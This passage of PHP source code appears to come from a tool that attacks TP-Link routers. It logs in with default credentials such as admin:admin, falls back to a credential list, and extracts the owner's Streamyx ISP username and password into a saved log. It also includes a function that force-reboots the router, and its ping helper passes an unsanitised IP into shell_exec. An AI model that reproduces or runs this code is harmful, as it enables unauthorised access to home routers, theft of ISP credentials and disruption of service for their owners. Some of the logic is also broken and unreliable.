	$data = curl("http://".$ip."/status/status_deviceinfo.htm", "", "", "admin:admin");
	$potong = cutstr($data, "Data Rate", "kbps");
	$rate = explode(" ", $potong);
	
	if(!empty($Username[2][0]) && !empty($Password[2][0])){
		$result .= "Streamyx User : ".$Username[2][0]."\n";
		$result .= "Streamyx Pass : ".$Password[2][0]."\n";
	}
	if(!empty($rate[12]) && !empty($rate[6])){
		$result .= "Upstream : ".$rate[12]."\n";
		$result .= "Downstream : ".$rate[6]."\n";
	}
	
	if($verbose){
		$result .= "Take data success ! \n";
	}
	
	return $result;
	
	if(isset($argv[3]) && $argv[3] == "-save"){
		makelog ("IP : $ip \r\nRouter : TP-Link\r\nStreamyx User : ".$Username[2][0]."\r\n"."Streamyx Pass : ".$Password[2][0]."\r\nUpstream : ".$rate[11]."\r\nDownstream : ".$rate[6]."\r\n\r\n", $argv[4]);
	}
}

/**
 * TP-Link Reboot by Shahril
 * @param string $ip -> Get ip then automatically reboot the Router.
 * @return bool -> Return bool result info.
 */
function TpLink_reboot($ip){

	global $list;
	
	//Login into Router and take data
	if($verbose){
		$result .= "Try to connect to TpLink router with default username & password\n";
	}
	$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", "admin:admin");
	
	//Using another verification
	if(strpos("401 Unauthorized", $Bukak)){
		if($verbose){
			$result .= "Default authentication fail, try with another\n";
		}
		foreach($list as $username => $pass){
			$Bukak = curl("http://".$ip."/wizard/wizardPPP.htm", "", "", $username.":".$password);
			if(strpos("401 Unauthorized", $Bukak) === FALSE){ continue; }
		}
	}
	
	if($verbose){
		echo "Authentication success ! Try to reboot that router now !\n";
	}
	$reboot = curl("http://".$ip."/Forms/tools_system_1", "", "restoreFlag=0&Restart=RESTART", "admin:admin");
	$reboot_data = curl("http://".$ip."/progress.htm", "", "", "admin:admin");
	if(strpos($reboot_data, "system is restarting")){ return true; }else{ return false; }
}

/**
 * @param string $content -> Extract Cookie from HTTP Respond
 * @return string -> Return cookie from http respond string.
 */
function GetCookies($content){
	preg_match_all('/Set-Cookie: (.*);/U',$content,$temp);
	$cookie = $temp[1];
	$cookies = implode('; ',$cookie);
	return $cookies;
}

/**
 * @param string $data -> Extract downstream from provide data
 * @return integer -> Return downstream from input data
 */
function getdownstream($data){
	return cutstr($data, "Downstream : ", "\n");
}

/**
 * Function to check user limit
 *
 * @param integer $down -> Get router downstream
 * @param string $input -> Get user limit
 * @return bool -> If $down and $input is equal, then true, otherwise false
 */
function limit($down, $input){
	if(strtolower($input) == "4mb"){
		if($down > 3900){
			return true;
		}
	}elseif(strtolower($input) == "2mb"){
		if($down > 1900){
			return true;
		}
	}elseif(strtolower($input) == "8mb"){
		if($down > 7800){
			return true;
		}
	}else{
		return false;
	}
}

/**
 * Ping IP and get the time output result
 * @param string $ip -> IP that need to ping
 * @return string -> If regex success, return time otherwise return unknown string
 */
function ping($ip){
	$ping_data = shell_exec("ping -n 1 -w 50 -i 6 ".$ip);
	if(preg_match('/time\=(.*)\ \TTL/', $ping_data, $output)){
		return $output[1];
	}else{
		return $output = "Unknown!";
	}
}

/**
 * Get HTML Source From URL
 * @param string $url -> Set url to get html source.
 * @param string $cookie -> Send server with provide cookie.
 * @param string $post -> Send post request into server.
 * @param string $auth -> Use when you want to make http authentication (username:password)
 * @return string -> Return html code.
 */
function curl($url, $cookies = "", $post = "", $auth = ""){
	global $user_agent;
	$ch = @curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	if($post){
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
	}
	if($auth){
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
		curl_setopt($ch, CURLOPT_USERPWD, $auth);
	}
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
	$page = curl_exec( $ch);
	curl_close($ch); 
	return $page;
}

/**
 * Cut String
 * @param string $data -> Source string you want to cut.
 * @param string $str1 -> Find string before text you want to cut.
 * @param string $str2 -> Last string after text you want to cut.
 * @return string -> Return string that have been cut.
 */
function cutstr($data, $str1, $str2){
	$data = explode($str1, $data);
	$data = explode($str2, $data[1]);
	return $data[0];
}

/**
 * Create Log/Save file
 * @param string $data -> Data/string/text that you want to save.
 * @param string $filename -> Name of file you want to save.
 */
function makelog($data, $filename) {
	$x= "Date/Time : ".date("d/M/Y h:i:s A")."\r\n".$data; 
	$fh = fopen($filename, 'w+') or die("can't open file");
	fwrite($fh, $x);
	fclose($fh);
}

?>